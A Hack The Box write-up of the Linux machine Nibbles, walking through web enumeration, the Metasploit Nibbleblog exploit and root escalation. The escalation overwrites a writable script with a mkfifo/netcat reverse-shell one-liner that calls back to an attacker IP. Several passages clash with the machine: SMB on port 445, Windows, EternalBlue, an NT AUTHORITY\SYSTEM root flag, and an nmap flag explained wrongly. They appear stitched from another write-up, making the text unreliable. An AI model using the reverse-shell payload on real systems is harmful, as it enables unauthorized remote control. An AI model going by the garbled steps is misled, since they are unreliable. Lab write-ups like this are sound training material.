# HTB - Nibbles

### Machine Information

- Difficulty: Easy
- OS: Linux
- Status: Retired
- Access: VIP

This write-up documents the exploitation of the retired Hack The Box machine Nibbles. The objective is to demonstrate a structured penetration testing methodology, covering the full attack chain from initial reconnaissance to privilege escalation.

The machine is approached from an attacker’s perspective, focusing on systematic enumeration, vulnerability identification, and practical exploitation techniques. Each step is documented with an emphasis on reasoning and methodology rather than just commands and outputs.

The goal of this report is both educational and portfolio-oriented, showcasing a repeatable workflow that reflects real-world penetration testing practices in a controlled lab environment.

## 1. Initial Enumeration

I started by performing an Nmap scan against the target machine to identify open ports, running services, and potential vulnerabilities.

```bash
sudo nmap -sV -sA 10.129.96.84
```

### Scan Explanation

- `-sV` enables version detection, allowing Nmap to identify service versions running on open ports.
- `-A` enables aggressive scanning, which includes OS detection, version detection, script scanning, and traceroute in a single command.

This type of scan provides a more detailed overview of the target compared to a basic service scan. It is particularly useful during the initial enumeration phase, as it helps identify not only running services and their versions, but also potential misconfigurations and attack vectors that can be further investigated.

The tradeoff is that -A is more intrusive and noisy compared to standard enumeration scans, but it significantly increases the amount of actionable information gathered early in the assessment.

This type of scan is useful during the initial reconnaissance phase because it provides a quick overview of the target system and helps identify potential attack vectors.

### Scan Results

The scan revealed several open ports, including SMB services running on port 445, which is commonly associated with Windows file sharing.

From the gathered information, it appeared that the target was running an older version of Windows that could potentially be vulnerable to the EternalBlue exploit (MS17-010).

### Scan Result

<img width="1010" height="833" alt="image" src="https://github.com/user-attachments/assets/905dcd6c-eda8-4f60-b31a-6575dd6202e0" />

## 2. Service Enumeration

From the initial Nmap scan, port 80 was identified as open, indicating that a web server is running on the target.

I proceeded to manually inspect the website in order to gather more information and understand the application running on the server.

<img width="1907" height="899" alt="image" src="https://github.com/user-attachments/assets/fb25c561-eb0f-4fd8-ae2f-e0d410c2d262" />

After reviewing the page source, I discovered a hidden directory that was not visible on the main page.

<img width="737" height="458" alt="image" src="https://github.com/user-attachments/assets/102f8ce1-2faa-4f03-9043-fdf75393d4de" />

After navigating to the hidden directory, I discovered that the target was running Nibbleblog.

<img width="1272" height="825" alt="image" src="https://github.com/user-attachments/assets/57fad2d1-08df-4cb9-817c-dd54b8cdbac7" />

Since the web server exposed limited information on the main page, directory brute forcing was performed using gobuster in order to identify hidden content and additional attack surface.

```bash
gobuster dir -u 10.129.96.84/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
```

<img width="955" height="744" alt="image" src="https://github.com/user-attachments/assets/f6a0098e-44e0-47f0-99ed-621f839adab1" />

### Scan Explanation

gobuster is a directory brute forcing tool used to discover hidden files and directories on a web server.

- `dir` tells Gobuster to perform directory enumeration.
- `-u` specifies the target URL.
- `-w` specifies the wordlist used during the scan.

This scan was performed to identify hidden content and additional attack surface that was not directly accessible from the main webpage.

Result

The scan revealed the /nibbleblog directory, indicating that the target was hosting a Nibbleblog CMS instance.

### Information Gathering from Directories

#### README

The README file contained information related to the Nibbleblog installation. This helped confirm that the target was running the Nibbleblog CMS and provided additional context about the application.

<img width="1894" height="894" alt="image" src="https://github.com/user-attachments/assets/14f98308-4625-4654-89a8-c7868bf5a57d" />

#### Content

The /content directory appeared to contain files and resources used by the web application, including uploaded content and plugin-related data. This indicated that the directory could potentially expose sensitive information useful for further enumeration.

<img width="686" height="410" alt="image" src="https://github.com/user-attachments/assets/387646cc-2503-408c-bdd9-cc57bb91beb0" />

#### Private

The /private directory suggested the presence of restricted or internal application data. Although direct access was limited, the directory itself indicated that sensitive files may exist on the server.

<img width="746" height="619" alt="image" src="https://github.com/user-attachments/assets/315b2f29-4367-4501-8cd9-9b46683c6067" />

#### config.xml

The config.xml file contained configuration-related information for the application. Configuration files are particularly valuable during enumeration because they may expose usernames, paths, or other sensitive application details.

<img width="864" height="951" alt="image" src="https://github.com/user-attachments/assets/1152e251-d25e-43fa-9ce3-7adf419f9620" />

#### admin.php

Navigating to admin.php revealed an administrative login panel for the Nibbleblog application.

<img width="1254" height="628" alt="image" src="https://github.com/user-attachments/assets/20b9836e-c1ca-4ae7-8577-21f123e589bd" />

After successful authentication, access to the administrative dashboard was obtained, allowing further inspection of the application's functionality and potential attack vectors.

<img width="1310" height="793" alt="image" src="https://github.com/user-attachments/assets/1c6669d0-1dd3-409c-84a9-67e3b6e3a0ee" />

## 3. Vulnerability Identification

### Metasploit
I started the Metasploit Framework:

```bash
msfconsole
```

<img width="855" height="797" alt="image" src="https://github.com/user-attachments/assets/09f8ab09-8b85-4d4a-b329-328c08e38d71" />

Within Metasploit, I searched for an exploit module related to the vulnerability nibbleblog:

<img width="1224" height="336" alt="image" src="https://github.com/user-attachments/assets/3bfd7834-c3a5-48bd-9e55-fca9a03bd4de" />

Further information about the selected Metasploit module was obtained using the following command:

```bash
info 0
```
This output provided additional context about the exploit, including its purpose, affected application, and prerequisites for successful exploitation.

<img width="569" height="736" alt="image" src="https://github.com/user-attachments/assets/86d44414-007c-434b-843a-7a071a5c850b" />

### Exploit Configuration

After selecting the EternalBlue exploit module, I configured the required parameters to ensure proper communication between the attacker and the target system.

- `RHOSTS` was set to the target machine’s IP address to define the remote system that the exploit should be executed against.
- `LHOST` was set to my local machine’s IP address in order to receive the incoming connection once the payload was successfully executed.
- `TARGETURI` The TARGETURI parameter specifies the exact path to the vulnerable web application on the target server. In this case, it was set to the Nibbleblog installation directory in order for the exploit to correctly interact with the application. This is necessary because the exploit needs to know where the vulnerable endpoint is located within the web server structure.
- `USERNAME` and `PASSWORD` The username and password parameters are used to authenticate against the Nibbleblog admin panel. Since the vulnerability being exploited requires authenticated access, valid credentials are needed before the file upload functionality can be reached. These values were either obtained through credential testing or default/common credentials during the enumeration phase.

These settings are required to establish a connection between the exploited host and the attacker machine during a reverse connection scenario.

<img width="1593" height="839" alt="image" src="https://github.com/user-attachments/assets/1f156b20-2291-43c8-8ee7-1cbec9a9a2c7" />

### Exploitation

After configuring the nibbleblog exploit module with the required parameters, I executed the attack against the target system.

<img width="1069" height="195" alt="image" src="https://github.com/user-attachments/assets/ec679b35-7ff4-424f-9cd4-e6030e4ad6c0" />

## 4. Exploitation

After gaining initial access to the target system, I performed basic system enumeration to understand the current user context and gather information relevant for potential privilege escalation.

### Initial System Enumeration
To identify the operating system and system details, I executed:

```bash
sysinfo
```

<img width="1001" height="135" alt="image" src="https://github.com/user-attachments/assets/718aadd2-dc6a-416d-a299-18b0a23290f9" />

This provided key information about the target environment, including OS version and architecture.

### Current User Context
To verify the privileges of the current session, I used:

<img width="838" height="81" alt="image" src="https://github.com/user-attachments/assets/12cfd4af-4ff9-466d-afb8-e496f920d9d6" />

### Shell Access

After gaining a successful session through Metasploit, a system shell was spawned in order to interact directly with the target operating system.

```bash
shell
```

<img width="827" height="99" alt="image" src="https://github.com/user-attachments/assets/f9f382a7-642a-4e7d-92d9-6d0bf82f7ead" />

### Shell Upgrade

After gaining an initial reverse shell, the session was upgraded to a fully interactive TTY using Python in order to improve usability and allow proper command execution.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

<img width="841" height="116" alt="image" src="https://github.com/user-attachments/assets/3656bb2e-9972-4b1e-83d6-6e4454093b2a" />

## 5. Privilege Escalation

After obtaining a stable shell on the target system, the next step was to identify possible privilege escalation vectors in order to gain root access.

System enumeration was performed to discover misconfigurations, weak permissions, or other attack paths that could be leveraged to escalate privileges.

<img width="830" height="190" alt="image" src="https://github.com/user-attachments/assets/ede6ae9b-dc7d-473c-ba75-29cdb94b21f0" />

After identifying the current user, I navigated to the /home directory in order to enumerate other users and potential privilege escalation targets.

<img width="930" height="139" alt="image" src="https://github.com/user-attachments/assets/366d6ccf-f086-438b-9873-69040a2bb762" />

During enumeration, a zip file was discovered. The file was extracted using unzip in order to investigate its contents.

```bash
unzip <file>.zip
```

<img width="511" height="279" alt="image" src="https://github.com/user-attachments/assets/4462a19c-1ade-4633-b531-6a854d59e745" />

### Script Modification

During enumeration, a writable script named monitor.sh was identified.

To gain a reverse shell as root, the script was modified by injecting a reverse shell payload using the following command:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 8443 >/tmp/f' > monitor.sh
```
This command overwrites the existing script content and inserts a reverse shell that connects back to the attacker machine when executed.

<img width="1457" height="72" alt="image" src="https://github.com/user-attachments/assets/b48dbcb5-1ea3-4030-b023-23a294f9feeb" />

### Netcat

netcat (`nc`) was used to create a reverse TCP connection from the target to the attacker machine. This allows the execution of commands on the target system through a remote shell once the connection is established.

<img width="702" height="106" alt="image" src="https://github.com/user-attachments/assets/6f3c3c98-bd08-4b4c-aaed-a8e42ef45bf8" />

<img width="649" height="163" alt="image" src="https://github.com/user-attachments/assets/5d8a3ec0-ab14-4a37-ae8c-fef9bc1a657b" />

This technique is commonly used in reverse shell payloads to establish interactive remote access.

## 6. Flags

### User Flag
After gaining initial access to the system, I located and retrieved the user flag.

<img width="194" height="159" alt="image" src="https://github.com/user-attachments/assets/f24f8030-f004-42ca-9294-eaace27dba4c" />

### Root Flag
After successfully escalating privileges to NT AUTHORITY\SYSTEM, I retrieved the root flag from the Administrator desktop.

<img width="145" height="113" alt="image" src="https://github.com/user-attachments/assets/62b6d829-dda6-4c2b-b5b7-cd55c59d5b33" />

## 7. Lessons Learned
- This machine highlighted the importance of thorough web enumeration, as hidden directories and files led directly to the discovery of the underlying CMS.

- A key takeaway was that seemingly simple misconfigurations, such as an exposed admin panel and weak authentication, can quickly lead to full system compromise when combined with known vulnerabilities.

- Another important lesson was the value of properly verifying application versions and researching known exploits before attempting manual exploitation.

- Finally, privilege escalation often depends on careful system enumeration, as misconfigured permissions (such as writable scripts executed with elevated privileges) can provide a direct path to root access.


## 8. Mitigation Recommendations

The initial compromise was possible due to weak authentication controls and the ability to enumerate valid usernames. Although a login blacklist mechanism was implemented, it did not sufficiently prevent credential guessing attacks.

To improve security, the following measures are recommended:

- Enforce strong password policies, including minimum length and complexity requirements.
- Implement multi-factor authentication (MFA) for administrative accounts.
- Prevent username enumeration by returning generic authentication error messages.
- Replace blacklist-based controls with effective rate limiting and account lockout mechanisms.
- Monitor authentication logs for brute-force and password-spraying attempts.
- Conduct regular security reviews of web applications to identify authentication weaknesses.

These controls reduce the likelihood of unauthorized access through credential guessing and account enumeration attacks.

## 9. Key Takeaway

Authentication security is more than just brute-force protection.
